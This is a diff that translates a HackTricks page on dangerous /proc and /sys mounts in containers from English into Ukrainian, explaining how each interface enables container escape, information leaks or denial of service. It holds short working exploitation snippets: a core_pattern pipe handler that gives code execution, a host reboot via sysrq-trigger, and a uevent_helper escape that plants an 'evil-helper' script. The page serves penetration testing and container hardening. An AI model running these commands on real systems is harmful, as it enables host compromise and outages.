@@ -1,181 +1,180 @@
-# Sensitive Mounts
+# Чутливі монти
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
 
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
+Викладення `/proc` та `/sys` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розголошення інформації. Ці каталоги містять чутливі файли, якщо їх неправильно налаштовано або доступ до них має несанкціонований користувач, це може призвести до втечі контейнера, модифікації хоста або надання інформації, яка допоможе в подальших атаках. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.
 
-**You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Ви можете знайти додаткові деталі щодо кожної потенційної уразливості за посиланням** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
-## procfs Vulnerabilities
+## Уразливості procfs
 
 ### `/proc/sys`
 
-This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:
+Цей каталог дозволяє змінювати ядерні змінні, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, що викликають занепокоєння:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-* Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-* Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
-*   **Testing and Exploitation Example**:
+* Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
+* Дозволяє визначити програму для виконання при генерації файлу ядра з першими 128 байтами як аргументами. Це може призвести до виконання коду, якщо файл починається з каналу `|`.
+*   **Приклад тестування та експлуатації**:
 
-    ```bash
-    [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-    cd /proc/sys/kernel
-    echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-    sleep 5 && ./crash & # Trigger handler
-    ```
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Перевірка доступу на запис
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # Встановлення власного обробника
+sleep 5 && ./crash & # Запуск обробника
+```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-* Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* Contains the path to the kernel module loader, invoked for loading kernel modules.
-*   **Checking Access Example**:
+* Детально описано в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Містить шлях до завантажувача ядра модулів, який викликається для завантаження ядерних модулів.
+*   **Приклад перевірки доступу**:
 
-    ```bash
-    ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
-    ```
+```bash
+ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
+```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-* A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
+* Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Глобальний прапорець, який контролює, чи викликати аварійне завершення ядра або викликати OOM killer при виникненні умови OOM.
 
 #### **`/proc/sys/fs`**
 
-* As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
-* Write access can enable various denial-of-service attacks against the host.
+* Згідно з [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), містить параметри та інформацію про файлову систему.
+* Доступ на запис може дозволити різноманітні атаки відмови обслуговування проти хоста.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-* Allows registering interpreters for non-native binary formats based on their magic number.
-* Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
-* Relevant exploit and explanation:
-  * [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
-  * In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+* Дозволяє реєструвати інтерпретатори для неіноземних бінарних форматів на основі їх магічного числа.
+* Може призвести до підвищення привілеїв або доступу до оболонки root, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
+* Відповідний експлойт та пояснення:
+* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
+* Підробиці в уроці: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### Others in `/proc`
+### Інші в `/proc`
 
 #### **`/proc/config.gz`**
 
-* May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
-* Useful for attackers to identify vulnerabilities in the running kernel.
+* Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
+* Корисно для зловмисників для виявлення вразливостей у робочому ядрі.
 
 #### **`/proc/sysrq-trigger`**
 
-* Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
-*   **Rebooting Host Example**:
+* Дозволяє викликати команди Sysrq, що потенційно можуть призвести до негайних перезавантажень системи або інших критичних дій.
+*   **Приклад перезавантаження хоста**:
 
-    ```bash
-    echo b > /proc/sysrq-trigger # Reboots the host
-    ```
+```bash
+echo b > /proc/sysrq-trigger # Перезавантажує хост
+```
 
 #### **`/proc/kmsg`**
 
-* Exposes kernel ring buffer messages.
-* Can aid in kernel exploits, address leaks, and provide sensitive system information.
+* Викриває повідомлення кільцевого буфера ядра.
+* Може допомогти в експлойтах ядра, витоках адрес та наданні чутливої системної інформації.
 
 #### **`/proc/kallsyms`**
 
-* Lists kernel exported symbols and their addresses.
-* Essential for kernel exploit development, especially for overcoming KASLR.
-* Address information is restricted with `kptr_restrict` set to `1` or `2`.
-* Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Перераховує символи ядра та їх адреси.
+* Необхідний для розробки експлойтів ядра, особливо для подолання KASLR.
+* Інформація про адресу обмежена з `kptr_restrict` встановлено на `1` або `2`.
+* Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
-* Interfaces with the kernel memory device `/dev/mem`.
-* Historically vulnerable to privilege escalation attacks.
-* More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Взаємодіє з пристроєм пам'яті ядра `/dev/mem`.
+* Історично вразливий до атак підвищення привілеїв.
+* Докладніше в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
-* Represents the system's physical memory in ELF core format.
-* Reading can leak host system and other containers' memory contents.
-* Large file size can lead to reading issues or software crashes.
-* Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+* Представляє фізичну пам'ять системи у форматі ядра ELF.
+* Читання може витікати вміст пам'яті хоста та інших контейнерів.
+* Великий розмір файлу може призвести до проблем з читанням або аварійної зупинки програмного забезпечення.
+* Детальне використання в [Вивантаження /proc/kcore в 2019 році](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
-* Alternate interface for `/dev/kmem`, representing kernel virtual memory.
-* Allows reading and writing, hence direct modification of kernel memory.
+* Альтернативний інтерфейс для `/dev/kmem`, що представляє віртуальну пам'ять ядра.
+* Дозволяє читання та запис, отже пряме змінення пам'яті ядра.
 
 #### **`/proc/mem`**
 
-* Alternate interface for `/dev/mem`, representing physical memory.
-* Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.
+* Альтернативний інтерфейс для `/dev/mem`, що представляє фізичну пам'ять.
+* Дозволяє читання та запис, зміна всієї пам'яті потребує вирішення віртуальних у фізичні адреси.
 
 #### **`/proc/sched_debug`**
 
-* Returns process scheduling information, bypassing PID namespace protections.
-* Exposes process names, IDs, and cgroup identifiers.
+* Повертає інформацію про планування процесів, обходячи захисти простору імен PID.
+* Викриває назви процесів, ідентифікатори та ідентифікатори cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
-* Provides information about mount points in the process's mount namespace.
-* Exposes the location of the container `rootfs` or image.
+* Надає інформацію про точки монтування в просторі імен монтування процесу.
+* Викриває місце розташування `rootfs` контейнера або зображення. 
 
-### `/sys` Vulnerabilities
+### Уразливості `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
-* Used for handling kernel device `uevents`.
-* Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
-*   **Example for Exploitation**: %%%bash
+* Використовується для обробки ядерних пристроїв `uevents`.
+* Запис до `/sys/kernel/uevent_helper` може виконати довільні скрипти при спрацюванні `uevent` тригерів.
+*   **Приклад експлуатації**: %%%bash
 
-    ## Creates a payload
+## Створює пейлоад
 
-    echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
+echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-    ## Finds host path from OverlayFS mount for container
+## Знаходить шлях хоста з монтування OverlayFS для контейнера
 
-    host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
+host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-    ## Sets uevent\_helper to malicious helper
+## Встановлює uevent\_helper на шкідливий помічник
 
-    echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
+echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-    ## Triggers a uevent
+## Запускає uevent
 
-    echo change > /sys/class/mem/null/uevent
+echo change > /sys/class/mem/null/uevent
 
-    ## Reads the output
+## Читає вивід
 
-    cat /output %%%
-
+cat /output %%%
 #### **`/sys/class/thermal`**
 
-* Controls temperature settings, potentially causing DoS attacks or physical damage.
+* Контролює налаштування температури, потенційно спричиняючи атаки DoS або фізичні пошкодження.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-* Leaks kernel addresses, potentially compromising KASLR.
+* Витікає адреси ядра, потенційно компрометуючи KASLR.
 
 #### **`/sys/kernel/security`**
 
-* Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
-* Access might enable a container to disable its MAC system.
+* Містить інтерфейс `securityfs`, що дозволяє налаштування модулів безпеки Linux, таких як AppArmor.
+* Доступ може дозволити контейнеру вимкнути свою систему MAC.
 
-#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` та `/sys/firmware/efi/efivars`**
 
-* Exposes interfaces for interacting with EFI variables in NVRAM.
-* Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
+* Викриває інтерфейси для взаємодії з змінними EFI в NVRAM.
+* Неправильна конфігурація або експлуатація може призвести до "замурованих" ноутбуків або незавантажуваних хост-машин.
 
 #### **`/sys/kernel/debug`**
 
-* `debugfs` offers a "no rules" debugging interface to the kernel.
-* History of security issues due to its unrestricted nature.
+* `debugfs` пропонує інтерфейс налагодження "без правил" для ядра.
+* Історія проблем з безпекою через його необмежений характер.
 
 ### References
 
@@ -185,14 +184,14 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити **рекламу вашої компанії в HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
 
 </details>
